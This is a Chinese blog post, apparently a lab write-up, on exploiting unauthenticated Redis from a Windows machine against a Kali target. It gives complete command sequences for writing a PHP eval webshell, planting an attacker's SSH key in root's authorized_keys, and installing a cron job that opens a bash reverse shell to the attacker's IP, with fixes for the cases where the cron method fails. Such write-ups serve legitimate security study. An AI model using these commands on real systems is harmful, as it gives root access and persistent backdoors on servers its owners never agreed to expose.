---
title: windows攻击机攻击Redis未授权漏洞
date: 2026-04-08T12:00:00+08:00
categories:
  - Web安全
tags:
  - Web安全
  - 渗透测试
---

# windows攻击机攻击Redis未授权漏洞

## 1. 测试环境

```
靶机：kali ip 192.168.42.130
攻击机： Windows 11 家庭中文版 ip 192.168.42.1
```

## 2. kali靶机 redis安装配置

```bash
wget http://download.redis.io/releases/redis-5.0.12.tar.gz

tar -zxvf redis-5.0.12.tar.gz

cd redis-5.0.12

make  //编译，过程稍长，成功会有特殊提示

cd src

cp redis-cli /usr/bin  

cp redis-server /usr/bin //将redis的服务端客户端都复制到/usr/bin下，方便直接启动使用

cd ../

cp redis.conf /etc  //将配置文件复制到/etc下，方便使用

 redis-server /etc/redis.conf   //用/etc/redis.conf文件启动redis服务
```

![image-20241112170140313](/images/notes/未授权-Redis-windows攻击/images/1.png)

自此，靶机redis服务成功开启

## 3. windows攻击机下载redis-cli

```
https://github.com/tporadowski/redis/releases
```

## 4. 写入webshell

### 4.1 利用前提

1.靶机redis链接未授权，在攻击机上能用redis-cli连上

2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经）

```
还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）
```

### 4.2 攻击细节

```bash
.\redis-cli.exe -h 192.168.42.130
config get dir #查看redis数据库路径
config set dir /root/Desktop/test# #修改靶机Redis数据库路径,要是存在的路径才可以
config get dbfilename
config set dbfilename webshell.php #设置数据库存储文件为/root/Desktop/test/webshell.php,生成shell.php文件
set xxx "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
#将一句话木马写入文件中
#"\r\n\r\n"是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。 "set xxx yyy"的意思是将键xxx的值设为yyy
set xxx "\r\n\r\n<?php eval($_POST[fuck]);?>\r\n\r\n"#上传木马可以通过蚁剑连接
save#保存
```

![image-20241112171900402](/images/notes/未授权-Redis-windows攻击/images/2.png)

![image-20241112171837050](/images/notes/未授权-Redis-windows攻击/images/3.png)

## 5. 写入公钥

### 5.0 ssh密钥连接

大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：

1. 客户端生成RSA公钥和私钥
2. 客户端将自己的公钥存放到服务器
3. 客户端请求连接服务器，服务器将一个随机字符串发送给客户端
4. 客户端根据自己的私钥加密这个随机字符串之后再发送给服务器
5. 服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。

### 5.1 利用前提

> 1. Redis 未授权访问漏洞
> 2. 服务器对外开启了 ssh 服务
> 3. Redis 服务器运行在 root 用户下（否则还要猜测用户用以修改authorized_keys的保存目录）

所以在实际渗透过程中，该服务器「端口扫描」结果至少要满足：

- Redis 服务 open（默认 6379 端口）
- ssh 服务 open（默认 22 端口）[没开 ssh 都是扯淡]

### 5.2 攻击细节

#### 5.2.1 密钥生成

```
ssh-keygen -t rsa    //默认即可，也可以自选目录存储
```

![image-20241112172934169](/images/notes/未授权-Redis-windows攻击/images/4.png)

![image-20241112173005903](/images/notes/未授权-Redis-windows攻击/images/5.png)

生成密钥之后我们可以**将公钥id_rsa.pub里面内容复制粘贴到key.txt文件中**，再上传到靶机上面。

#### 5.2.2 密钥写入

```bash
type key.txt | redis-cli.exe -h 192.168.42.130 -x set xxx
#如果是linux 将type换成cat.
#-x 代表从标准输入读取数据作为该命令的最后一个参数。
#将公钥作为value插入到数据库中，key随便啥值。
你也可以直接写入：
redis-cli.exe -h 192.168.42.130 -x set xxx  "\r\n公钥内容\r\n"

#修改redis数据库路径
redis-cli.exe -h 192.168.42.130 config set dir /root/.ssh
#生成缓冲文件authorized_keys
redis-cli.exe -h 192.168.42.130 config set dbfilename authorized_keys
#保存
redis-cli.exe -h 192.168.42.130 save
#连接
ssh -i id_rsa root@192.168.42.130
ssh -i id_rsa 192.168.42.130
```

#### 5.2.3 注意

- 如果你是linux系统使用cat,是windows系统使用type.
- 如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa root@192.168.42.130需要在.ssh目录下，因为权限问题。
- 你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。
- 文件名必须是authorized_keys,由配置文件决定的。

 **实际操作下来，还是linux操作好一点，windows有点难受**

## 6. 计划任务反弹shell

### 6.1 利用条件

- redis以root权限运行

### 6.2 前置知识

**ubuntu下可以利用的cron有以下几个地方：**

- **/etc/crontab：该文件里面的任务计划可以直接执行**
- **/etc/cron.d/\*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况**
- **/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600**

**CentOS下计划任务文件**

- **/etc/crontab：该文件里面的任务计划可以直接执行**
- **/var/spool/cron/root：该文件里面的任务计划可以直接执行**

**这里我们分别使用ubuntu靶机和CentOS靶机进行反弹shell测试**

#### 6.2.1 CentOS系统写入反弹shell

先在攻击机上监听自定义端口

```bash
nc -lvnp 23333
```

![img](/images/notes/未授权-Redis-windows攻击/images/6.png)

然后新开一个终端写入如下命令

```python
set  xx   "\n* * * * * /bin/bash -i >& /dev/tcp/192.168.42.1/2333 0>&1\n"
set  xx   "\n1 * * * * /bin/bash -i >& /dev/tcp/192.168.42.1/2333 0>&1\n"
#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。
config set dir /var/spool/cron/

config set dbfilename root

save
```

一分钟左右，顺利拿到反弹shell，如下图服务器权限为root

![img](/images/notes/未授权-Redis-windows攻击/images/7.png)

#### 6.2.2 ubuntu系统写入反弹shell

前置知识

linux里面的cron中command执行的shell环境是/bin/sh
而ubuntu中/bin/sh这个软连接指向了dash,而我们反弹shell使用的shell环境是bash

```bash
$ ls -al /bin/sh
lrwxrwxrwx 1 root root /bin/sh -> dash
```

所以我们先将修改软连接指向

```bash
$ ln -s -f bash /bin/sh
$ ls -al /bin/sh
lrwxrwxrwx 1 root root /bin/sh -> bash
```

##### ubuntu下写入/var/spool/cron/crontabs/目录

同样的流程，但这次等了半天却没有成功反弹

![img](/images/notes/未授权-Redis-windows攻击/images/8.png)

为了探究到底什么原因导致没有成功，我们在靶机上查看系统日志，如下图，可以看到是因为写入的root文件的权限不是预期600而报错

![img](/images/notes/未授权-Redis-windows攻击/images/9.png)

查看写入root文件权限为644，因此在/var/spool/cron/crontabs目录下不能进行反弹

##### 写入 **/etc/cron.d** 和 **/etc/crontab** 

经过测试还是无法成功反弹shell

查看日志错误原因是**ERROR (Syntax error, this crontab file will be ignored)**，即redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的。

### 6.3 解决redis反弹shell失败

#### 6.3.1 cron未启动

首先你要看一下你的cron启动没有，可以先查看状态如果是running,那就不用管，如果不是就需要启动一下，一般而言cron都是自启动的。所以一般来说不会是这个出问题。

```
service crond restart重启service crond start启动
service crond stop关闭service crond status查看状态
```

#### 6.3.2 写入乱码

我发现我的cron启动了但是依然无法反弹shell,去找了资料知道利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。我们手动删除乱码发现反弹仍然失败，查看资料发现我们还需要关注以下问题。

#### 6.3.3 root文件的权限

必须为600也就是说是rw-----------

```
chmod 600 root#修改root文件权限
```

#### 6.3.4 shell环境错误

我们反弹shell的/bin/sh是bash，而我的靶机的bin/sh是dash ,所以运行出错。我们需要通过以下命令查看和修改。

```
ls -al /bin/sh查看运行环境ln -s -f bash /bin/sh修改为bash
```

当我们按照上述步骤修改完成可以看到反弹成功。但是ifconfig不能执行可以通过下面代码是的ifconfig成功执行。

```
ln -s /usr/sbin/ifconfig /usr/bin/ifconfig
```

#### 6.3.5 总结

计时任务反弹shell 如果是ubuntu和debian操作系统这个就没有办法利用成功，centos操作系统是可以的利用的
